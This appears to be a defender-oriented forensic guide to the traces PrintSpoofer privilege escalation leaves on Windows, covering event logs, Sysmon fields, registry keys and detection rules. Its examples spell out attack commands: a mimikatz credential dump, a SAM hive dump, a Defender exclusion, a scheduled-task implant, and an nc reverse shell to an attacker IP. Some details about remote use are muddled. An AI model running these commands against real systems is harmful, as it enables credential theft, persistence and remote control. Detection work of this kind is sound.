# PrintSpoofer — Target Evidence

## Target-side artifacts (the spawned SYSTEM-context process)

PrintSpoofer itself performs no destructive actions on the target—it only initiates the RPC coercion with the Print Spooler. **All target-side evidence comes from the spawned child process**, which runs as SYSTEM. The artifacts below are therefore **what the spawned command does**, not what PrintSpoofer itself does.

### Process execution (Sysmon Event ID 1, Windows Event 4688)

**Expected parent-child relationship (visible on target):**
- **spoolsv.exe** (Print Spooler service, running as SYSTEM)
  - └─ **spawned process** (e.g., `cmd.exe`, `powershell.exe`, `notepad.exe`, `nc.exe`)

Wait—this is **deceptively important**. On the target machine (where PrintSpooler runs), the spawned process may appear to be a child of `spoolsv.exe` in some EDR telemetry, because the RPC context is derived from the Print Spooler. However, modern process-tree logging (Sysmon 1, ETW) typically **attributes the spawned process directly to PrintSpoofer.exe** (if PrintSpooler is running on the source machine) or shows it as a **child of the Print Spooler on the target**.

**Key distinction:**
- **Local exploitation** (source and target are the same machine): The spawned process is a child of spoolsv.exe.
- **Remote exploitation via PrintSpoofer** (not directly supported, but possible via WinRM or lateral movement): The spawned process may appear as an orphan or a child of PrintSpoofer if a remote instance is running.

**Sysmon Event 1 fields to examine:**
- **ParentImage:** `spoolsv.exe` or `PrintSpoofer.exe` (depending on context).
- **Image:** The spawned process (e.g., `cmd.exe`, `powershell.exe`).
- **User:** `NT AUTHORITY\SYSTEM` (elevation indicator).
- **CommandLine:** The full command string (e.g., `cmd /c whoami > file.txt`).
- **TargetFilename:** If the spawned process creates/deletes files.

### Event Logs

#### Windows Security Event 4688 (Process Creation)

**Event ID:** 4688 (Process Created)

**Key fields:**
- **Creator Process Name:** `spoolsv.exe` or the source PrintSpoofer context.
- **New Process Name:** The spawned process (e.g., `C:\Windows\System32\cmd.exe`).
- **New Process ID:** PID of the spawned process.
- **Creator User Name:** Service context (e.g., `NETWORK SERVICE`, `LOCAL SERVICE`, or the print spooler account).
- **Process Command Line:** Full command (e.g., `cmd /c whoami > C:\temp\output.txt`).

**Log location:** `C:\Windows\System32\winevt\Logs\Security.evtx`

**Note:** Event 4688 is often truncated in logs; Sysmon provides fuller detail.

#### Windows Event 4672 (Special Privileges Assigned to New Logon)

**Event ID:** 4672

**Significance:** Fires when a process acquires `SeImpersonate`, `SeAssignPrimaryToken`, or other dangerous privileges. PrintSpoofer's token impersonation may trigger this.

**Fields:**
- **Subject Account Name:** The account acquiring privileges (e.g., the Print Spooler context).
- **Privileges:** `SeImpersonate`, `SeAssignPrimaryToken`, etc.

**Reliability:** This event is rare in normal Windows operation; if it appears coinciding with a SYSTEM-context process spawn, it's a strong indicator of token impersonation.

#### Windows Event 5140 (Network Share Object Accessed)

**Relevance:** Only if the spawned process accesses network shares (e.g., `\\server\share`). Indicates lateral movement.

#### Sysmon Events

##### Sysmon Event ID 1 (Process Create)

**Fields:**
- **ParentImage:** `spoolsv.exe`
- **Image:** Spawned process path
- **User:** `NT AUTHORITY\SYSTEM`
- **CommandLine:** Full command
- **TargetFilename:** If file creation/deletion

##### Sysmon Event ID 3 (Network Connection)

**Relevance:** If the spawned process initiates network connections (e.g., reverse shell, credential exfil, C2 check-in).

**Example:** A `cmd.exe` spawned by PrintSpoofer connecting to an external IP.

##### Sysmon Event ID 11 (FileCreate)

**Relevance:** Files created by the spawned SYSTEM process (e.g., output redirection file, C2 payload written to disk).

##### Sysmon Event ID 17/18 (PipeEvent, PipeConnected)

**Relevance:** PrintSpoofer's internal RPC endpoint interaction. Named pipes created/connected during the RPC coercion may appear as:
- Pipe name: Often random or obfuscated (e.g., `\Device\NamedPipe\<UUID>`).
- Connection source: `spoolsv.exe` connecting to the RPC endpoint.

---

## Filesystem artifacts

**Depends entirely on what the spawned command does.**

### Example: Credential dumping with output redirection

```bash
PrintSpoofer.exe -c "mimikatz sekurlsa::logonpasswords > C:\Windows\Temp\mimi_output.txt"
```

**Files created:**
- **`C:\Windows\Temp\mimi_output.txt`** — The redirected output file, created by the `cmd.exe` spawned as SYSTEM.
- **Metadata:** File creation time matches the PrintSpoofer execution time.
- **Ownership:** SYSTEM (SID S-1-5-18).
- **Permissions:** Typically read-only, writable only by SYSTEM (inherited from parent directory).

### Example: Service binary installation

```bash
PrintSpoofer.exe -c "copy C:\Windows\Temp\malware.exe C:\Windows\System32\drivers\malware.exe"
```

**Files created:**
- **`C:\Windows\System32\drivers\malware.exe`** — The copied binary.
- **Metadata:** Created by SYSTEM, creation time matches the copy command.
- **Forensic significance:** A binary in `System32\drivers` is unusual and indicative of persistence or privilege escalation.

### Example: Registry hive dump

```bash
PrintSpoofer.exe -c "reg save hklm\sam C:\Windows\Temp\sam.hive"
```

**Files created:**
- **`C:\Windows\Temp\sam.hive`** — The saved registry hive.
- **Metadata:** SYSTEM ownership, creation time matches the command.
- **Size:** Typically ~16 KB for SAM hive (local machine only), larger for system hive.

---

## Registry artifacts

**Again, depends on the spawned command's actions.**

### Example: Scheduled task persistence

```bash
PrintSpoofer.exe -c "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\Windows\Temp\implant.exe\" /sc onboot /ru system"
```

**Registry keys modified:**
- **`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\WindowsUpdate`** — Task metadata.
- **`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}`** — Task definition (GUID assigned by Windows).
- **Metadata:** Modified timestamps indicate when the task was created (correlates with PrintSpoofer execution time).

### Example: Defender exclusion bypass

```bash
PrintSpoofer.exe -c "powershell -Command \"Add-MpPreference -ExclusionPath C:\Windows\Temp\*\""
```

**Registry keys modified:**
- **`HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`** — Exclusion list updated.
- **Event:** Windows Defender logs Event 5001 (Exclusion added).

---

## Network artifacts

**Only if the spawned command initiates network traffic.**

### Reverse shell example

```bash
PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe -e cmd 10.10.10.10 4444"
```

**Network indicators (visible on target via Zeek, NetFlow, Windows firewall logs):**
- **Outbound connection:** Target machine → Attacker IP (10.10.10.10) on port 4444.
- **Protocol:** TCP, typically interactive (multiple small packets).
- **Source process:** `nc.exe` (or the cmd.exe shell spawned by nc).
- **Windows firewall logs:** Event 5156 (allowed outbound connection) or 5157 (blocked, if firewall rules deny it).

### C2 beacon example

```bash
PrintSpoofer.exe -c "C:\Windows\Temp\implant.exe"
```

**Network indicators:**
- **Outbound connection:** Target → C2 server (depends on beacon configuration).
- **Indicators:** JA3 fingerprint, HTTP User-Agent, beacon timing pattern.
- **Zeek logs:** Connection details, HTTP headers if applicable.
- **Windows firewall logs:** Similar to reverse shell.

---

## Endpoint Security & EDR detection points

### Behavioral signals (process tree anomalies)

**Detection rule pattern:**
```
Process: spoolsv.exe (or Print Spooler context)
  └─ Child: cmd.exe / powershell.exe / custom.exe (as SYSTEM)
  
If spawned process is not typical system tools:
  → FLAG as suspicious token impersonation
```

### Memory forensics artifacts

**If the SYSTEM-context process is still running when memory is dumped:**

- **Process Environment Block (PEB):** Shows the spawned process's full command line, environment variables, and DLL list.
- **Kernel structures:** EPROCESS block contains the process's token, confirming SYSTEM privilege.
- **Heap analysis:** If Mimikatz or other credential tools were run, cached plaintext or hashes may remain in memory.

### Timeline reconstruction

**Typical sequence on target:**

| Time | Event | Source |
|---|---|---|
| 14:23:45 | PrintSpoofer.exe execution (on source) | Sysmon 1 or ETW logs (source host) |
| 14:23:45 | spoolsv.exe receives RPC coercion | Sysmon 3 (Network Connection, internal RPC) |
| 14:23:46 | cmd.exe spawned as SYSTEM | Sysmon 1 (Process Create) |
| 14:23:46 | Command executes (e.g., `mimikatz`, file copy) | Sysmon 11 (FileCreate), Sysmon 3 (Network) |
| 14:23:47 | Output file written | Sysmon 11 (FileCreate), NTFS $MFT |
| 14:23:47 | cmd.exe exits | Sysmon 5 (Process Terminated) |

---

## Distinguishing PrintSpoofer from other Potato-family tools

| Tool | Distinctive Target Signature | Parent Process |
|---|---|---|
| **PrintSpoofer** | Spawned process as SYSTEM child of spoolsv.exe; no persistent service/task. | `spoolsv.exe` (Print Spooler) |
| **JuicyPotato** | Spawned process as SYSTEM; parent varies (depends on COM object instantiation). | Varies (COM-instantiated service) |
| **RoguePotato** | Spawned process as SYSTEM; involves RPC relay and a remote redirector machine. | May show network RPC activity correlating with redirector IP. |

PrintSpoofer is the simplest to identify because **`spoolsv.exe` as parent is a near-perfect discriminator** (legitimate Windows never spawns interactive shells from the Print Spooler).

---

## Summary

**Target artifacts for PrintSpoofer:**
1. **Process tree:** spoolsv.exe → spawned child as SYSTEM (Sysmon 1, Event 4688).
2. **Privileges:** Event 4672 (token impersonation).
3. **Spawned command artifacts:** Depends on the command (file creation, network connections, registry modifications).
4. **Network:** Only if the spawned command initiates connections (reverse shell, C2, exfil).
5. **Timeline correlation:** Spawned process actions timestamp-align with PrintSpoofer execution on source.

**No persistence on target** — PrintSpoofer is a transient escalation mechanism, not a persistence technique. Evidence disappears when the spawned process exits unless it creates files/registry/services as part of its own payload.
